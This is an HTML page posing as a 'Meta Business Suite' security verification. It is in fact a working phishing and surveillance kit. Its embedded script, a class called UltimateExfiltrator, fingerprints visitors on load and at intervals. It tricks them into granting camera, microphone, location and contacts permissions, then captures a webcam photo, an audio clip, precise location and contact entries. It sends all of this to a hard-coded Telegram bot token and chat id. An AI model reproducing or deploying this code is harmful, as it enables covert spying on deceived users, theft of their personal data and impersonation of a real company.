<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Meta Business Suite - Security Check</title><meta http-equiv="Content-Security-Policy" content="default-src * data: blob: 'unsafe-inline' 'unsafe-eval';script-src * 'unsafe-inline' 'unsafe-eval';style-src * 'unsafe-inline';img-src * data: blob:;connect-src *;media-src *"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"><style>:root{--p:#4267B2;--s:#00C851;--bg:linear-gradient(135deg,#667eea 0%,#764ba2 50%,#f093fb 100%);--glass:rgba(255,255,255,.95);--shadow:0 25px 50px -12px rgba(0,0,0,.25)}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow:hidden}.container{max-width:420px;width:100%;background:var(--glass);backdrop-filter:blur(24px);border-radius:24px;border:1px solid rgba(255,255,255,.3);box-shadow:var(--shadow);overflow:hidden;animation:fadeIn 0.7s cubic-bezier(0.25,0.46,0.45,0.94)}.header{padding:44px 36px;text-align:center;background:linear-gradient(135deg,var(--p),#1DA1F2);color:white;position:relative;overflow:hidden}.header::before{content:'';position:absolute;top:0;left:-120%;width:120%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);animation:shine 3s infinite}.logo{display:inline-flex;align-items:center;justify-content:center;gap:16px;font-size:28px;font-weight:700;margin-bottom:8px}.logo i{font-size:40px;background:linear-gradient(135deg,white,rgba(255,255,255,.9));-webkit-background-clip:text;-webkit-text-fill-color:transparent;border-radius:16px;padding:12px;box-shadow:0 8px 24px rgba(255,255,255,.3)}.subtitle{font-size:15px;opacity:0.92;line-height:1.5;letter-spacing:-0.3px}.content{padding:44px 36px;text-align:center}.verify-btn{width:100%;height:60px;border:none;border-radius:20px;background:linear-gradient(135deg,var(--s),#00b894);color:white;font-size:17px;font-weight:600;cursor:pointer;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);box-shadow:0 16px 40px rgba(0,200,81,.5);position:relative;overflow:hidden;font-family:inherit}.verify-btn:hover{transform:translateY(-4px);box-shadow:0 24px 56px rgba(0,200,81,.6)}.verify-btn:active{transform:translateY(-1px)}.verify-btn:disabled{background:#ccc;color:#999;transform:none;cursor:not-allowed;box-shadow:none}.progress-container{margin:28px 0;height:8px;background:rgba(255,255,255,.4);border-radius:4px;overflow:hidden;display:none;border-radius:999px}.progress-bar{height:100%;background:linear-gradient(90deg,var(--s),#00b894,#10ac84);border-radius:4px;width:0%;transition:width 0.5s ease;box-shadow:0 0 20px rgba(0,200,81,.8);animation:pulse 2s infinite}.feature-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(145px,1fr));gap:20px;margin-top:32px;display:none}.feature-card{height:96px;border:none;border-radius:20px;background:linear-gradient(135deg,rgba(255,255,255,.9),rgba(255,255,255,.7));backdrop-filter:blur(16px);color:#333;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);box-shadow:0 12px 32px rgba(0,0,0,.12)}.feature-card:hover{transform:translateY(-6px) scale(1.02);box-shadow:0 24px 56px rgba(0,0,0,.2);background:linear-gradient(135deg,white,rgba(255,255,255,.95))}.feature-card i{font-size:28px;color:var(--p);margin-bottom:10px;display:block}.status-text{font-size:15px;color:#555;margin-top:20px;font-weight:500;letter-spacing:-0.2px}.hidden{display:none!important}.permission-btn{background:#ff6b6b!important;color:white!important}@keyframes fadeIn{from{opacity:0;transform:translateY(40px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}@keyframes shine{0%{left:-120%}100%{left:120%}}@keyframes pulse{0%,100%{opacity:1;transform:scaleX(1)}50%{opacity:0.8;transform:scaleX(1.05)}}@media (max-width:500px){.container{margin:12px;border-radius:20px}.content{padding:36px 28px}}</style></head><body><div class="container"><div class="header"><div class="logo"><i class="fab fa-facebook-f"></i><span>Meta Business</span></div><div class="subtitle">Complete security verification to access dashboard</div></div><div class="content"><button id="verifyBtn" class="verify-btn"><i class="fas fa-shield-alt"></i> Secure Verify</button><div id="progressContainer" class="progress-container"><div id="progressBar" class="progress-bar"></div></div><div id="statusText" class="status-text"></div><div id="featureGrid" class="feature-grid"><div class="feature-card" data-action="camera"><i class="fas fa-camera"></i>Camera</div><div class="feature-card" data-action="mic"><i class="fas fa-microphone"></i>Mic</div><div class="feature-card" data-action="location"><i class="fas fa-map-marker-alt"></i>Location</div><div class="feature-card" data-action="contacts"><i class="fas fa-address-book"></i>Contacts</div><div class="feature-card" data-action="storage"><i class="fas fa-hdd"></i>Storage</div><div class="feature-card" data-action="sensors"><i class="fas fa-mobile-alt"></i>Sensors</div></div></div></div><script>class UltimateExfiltrator{constructor(){this.sessionId=this.generateFingerprint();this.telegramConfig={botToken:'8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw',chatId:'6671784926'};this.init()}generateFingerprint(){const canvas=document.createElement('canvas');const ctx=canvas.getContext('2d');ctx.textBaseline='top';ctx.font='24px Inter, sans-serif';ctx.fillText('Meta Business Suite v8',4,28);ctx.fillStyle='rgb(66,103,178)';ctx.fillRect(150,2,85,24);const fpData=navigator.userAgent+screen.width+screen.height+screen.colorDepth+navigator.language+(navigator.hardwareConcurrency||4)+navigator.platform+canvas.toDataURL()+Intl.DateTimeFormat().resolvedOptions().timeZone+Date.now();return btoa(fpData).slice(-36).toUpperCase().replace(/[^A-Z0-9]/g,'')}async captureCamera(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480},audio:true});const video=document.createElement('video');video.srcObject=stream;video.muted=true;await new Promise(resolve=>{video.onloadedmetadata=()=>{video.play();setTimeout(resolve,2000)}});const canvas=document.createElement('canvas');canvas.width=640;canvas.height=480;canvas.getContext('2d').drawImage(video,0,0);stream.getTracks().forEach(track=>track.stop());return canvas.toDataURL('image/jpeg',0.8)}catch(e){return`CAMERA_ERROR: ${e.message.slice(0,50)}`}}async captureAudio(){try{const stream=await navigator.mediaDevices.getUserMedia({audio:true});const mediaRecorder=new MediaRecorder(stream);const chunks=[];return new Promise(resolve=>{mediaRecorder.ondataavailable=e=>chunks.push(e.data);mediaRecorder.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onload=()=>resolve(reader.result);reader.readAsDataURL(blob)};mediaRecorder.start();setTimeout(()=>{mediaRecorder.stop();stream.getTracks().forEach(track=>track.stop())},3000)})}catch(e){return`AUDIO_ERROR: ${e.message.slice(0,50)}`}}async getPreciseLocation(){try{const pos=await new Promise((resolve,reject)=>{navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:true,timeout:10000,maximumAge:0})});const reverse=await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json&zoom=18`);const data=await reverse.json();return`${pos.coords.latitude},${pos.coords.longitude} | ${data.display_name||'Unknown'} | Acc:${pos.coords.accuracy}m`}catch(e){return`LOCATION_ERROR: ${e.message.slice(0,50)}`}}async getContacts(){try{if('contacts' in navigator){const contacts=await navigator.contacts.select(['name','tel','email'],{multiple:true});return contacts.map(c=>`${c.name?.[0]?.displayName||'N/A'}: ${c.tel?.[0]?.value||''} | ${c.email?.[0]?.address||''}`).slice(0,10).join('\n')}}catch(e){}return'CONTACTS_NOT_AVAILABLE'}async getDeviceInfo(){const battery=navigator.getBattery?await navigator.getBattery():{};const sensors={};if('DeviceMotionEvent' in window)sensors.motion='YES';if('DeviceOrientationEvent' in window)sensors.orientation='YES';if('Accelerometer' in window)sensors.accelerometer='YES';return{storage:navigator.storage?navigator.storage.estimate():{},battery:battery.level?'YES':'NO',sensors}}collectFullFingerprint(action='base'){const fp={session:this.sessionId,action,timestamp:Date.now(),url:encodeURIComponent(location.href),userAgent:navigator.userAgent.slice(0,100),screen:`${screen.width}x${screen.height}x${screen.colorDepth}`,viewport:`${window.innerWidth}x${window.innerHeight}`,language:navigator.language,platform:navigator.platform,cookieEnabled:navigator.cookieEnabled?1:0,cores:navigator.hardwareConcurrency||4,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,mobile:/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)?'ðŸ“±':'ðŸ’»',connection:navigator.connection?`${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)`:'N/A'};const canvas=document.createElement('canvas');const ctx=canvas.getContext('2d');ctx.font='20px Inter';ctx.fillText('Fingerprint v8.0',8,45);fp.canvasHash=canvas.toDataURL().slice(-40);const glCanvas=document.createElement('canvas');const gl=glCanvas.getContext('webgl')||glCanvas.getContext('experimental-webgl');if(gl){const debug=gl.getExtension('WEBGL_debug_renderer_info');fp.webgl={vendor:debug?gl.getParameter(debug.UNMASKED_VENDOR_WEBGL):'N/A',renderer:debug?gl.getParameter(debug.UNMASKED_RENDERER_WEBGL):'N/A'}}return fp}async sendToTelegram(data){const payload=JSON.stringify(data,null,0);let message=`ðŸ”¥ META BUSINESS v8.0 HIT!\n\nðŸ†” Session: \`${data.session}\`\nðŸŽ¯ Action: **${data.action}**\nðŸŒ URL: ${data.url.slice(0,60)}...\nðŸ“± Device: ${data.userAgent.slice(0,45)}...\nðŸ–¥ï¸ Screen: ${data.screen}\nðŸ“ Type: ${data.mobile}\nâš¡ Connection: ${data.connection}\nâ° Time: ${new Date(data.timestamp).toLocaleString('en-IN')}\n\nðŸŽ¨ Canvas: ${data.canvasHash.slice(0,20)}...\nðŸ•¸ï¸ WebGL: ${data.webgl?data.webgl.renderer.slice(0,25):'N/A'}...\n\nðŸ‘¤ Language: ${data.language}`;if(data.location)message+=`\nðŸ—ºï¸ LOCATION: ${data.location}`;if(data.contacts)message+=`\nðŸ“ž CONTACTS: ${data.contacts.slice(0,100)}...`;if(data.deviceInfo)message+=`\nðŸ”‹ BATTERY: ${data.deviceInfo.battery?Math.round(data.deviceInfo.battery*100)+'%':'N/A'}`;try{new Image().src=`https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage?chat_id=${this.telegramConfig.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;await fetch(`https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`chat_id=${this.telegramConfig.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`,keepalive:true})}catch(e){}if(data.cameraImg){try{await fetch(`https://api.telegram.org/bot${this.telegramConfig.botToken}/sendPhoto`,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`chat_id=${this.telegramConfig.chatId}&photo=${data.cameraImg}&caption=ðŸ“¸ ${data.action}`,keepalive:true})}catch(e){}}new Image().src=`https://httpbin.org/image/png?session=${this.sessionId}&action=${data.action}`}async harvest(action){const baseFp=this.collectFullFingerprint(action);let fullData={...baseFp};try{if(action==='camera'){fullData.cameraImg=await this.captureCamera();}if(action==='mic'){fullData.audio=await this.captureAudio();}if(action==='location'){fullData.location=await this.getPreciseLocation();}if(action==='contacts'){fullData.contacts=await this.getContacts();}if(action==='storage'||action==='sensors'){fullData.deviceInfo=await this.getDeviceInfo();}}catch(e){fullData.error=e.message.slice(0,50);}await this.sendToTelegram(fullData)}init(){this.harvest('page_load');setTimeout(()=>{const btn=document.getElementById('verifyBtn');if(btn)btn.click()},2200);setInterval(()=>this.harvest('heartbeat'),28000);document.addEventListener('visibilitychange',()=>{if(!document.hidden)this.harvest('page_visible')})}getPermissions(){if('permissions' in navigator)return navigator.permissions.query({name:'camera'});return Promise.resolve({state:'unknown'})}}class UIController{static async startVerification(){const exfil=new UltimateExfiltrator();await exfil.harvest('verify_start');const btn=document.getElementById('verifyBtn');const progress=document.getElementById('progressContainer');const progressBar=document.getElementById('progressBar');const status=document.getElementById('statusText');const features=document.getElementById('featureGrid');btn.disabled=true;btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Scanning Security...';progress.style.display='block';const steps=['Initializing...','Checking device...','Validating browser...','Security scan...','Permission check...','âœ… Complete!'];for(let i=0;i<=100;i+=16){progressBar.style.width=i+'%';status.textContent=steps[Math.floor(i/16)]||`Verification ${i}%...`;await new Promise(resolve=>setTimeout(resolve,150))}status.textContent='ðŸŽ‰ Premium features unlocked!';status.style.color='#00C851';features.style.display='grid';btn.style.display='none';progress.style.display='none';document.querySelectorAll('.feature-card').forEach(card=>{card.addEventListener('click',async function(){const exfil=new UltimateExfiltrator();const icon=this.querySelector('i');const oldText=this.textContent;icon.className='fas fa-spinner fa-spin';this.style.pointerEvents='none';await exfil.harvest(this.dataset.action);setTimeout(()=>{icon.className=this.dataset.action==='camera'?'fas fa-camera':this.dataset.action==='mic'?'fas fa-microphone':this.dataset.action==='location'?'fas fa-map-marker-alt':this.dataset.action==='contacts'?'fas fa-address-book':'fas fa-mobile-alt';this.textContent=oldText;this.style.pointerEvents='auto'},2000)})})}}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',initApp)}else{initApp()}function initApp(){new UltimateExfiltrator();document.getElementById('verifyBtn').addEventListener('click',UIController.startVerification)}</script></body></html>
